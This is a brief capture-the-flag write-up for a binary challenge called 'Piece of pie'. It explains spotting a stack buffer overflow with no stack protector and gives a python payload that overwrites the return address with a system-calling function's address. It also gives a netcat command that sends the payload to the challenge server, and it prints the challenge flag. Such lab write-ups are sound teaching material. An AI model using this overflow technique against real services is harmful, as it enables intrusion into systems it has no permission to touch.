# Piece of pie

Flag: CNS_CTF{0398cc2fb77e03bc2878cf981731508e}

Tools: [`ida`, `nm`, `nc`, `python`, `file`, `checksec`]

Description:
First I ran the program and so it does a Segmentation Fault when the input is too big.
This hinted to a buffer overflow.
I opened the file in IDA and found that there was a 32 byte overflow and a function that did a `system` call.
Next I just checked the `checksec` output and found that the binary had no stack protection.
Finally I got the address of the function with `nm` and built a payload after checking that the file was on 64-bit.
The payload below worked, I connected to the server and got the flag.


Command:
```bash
    python3 -c 'print("A" * 32 + "B" * 8 + "\x56\x06\x40\x00\x00\x00\x00\x00")' > payload
```

To get the flag:
```bash
    cat payload - | nc 141.85.224.106 31339
```

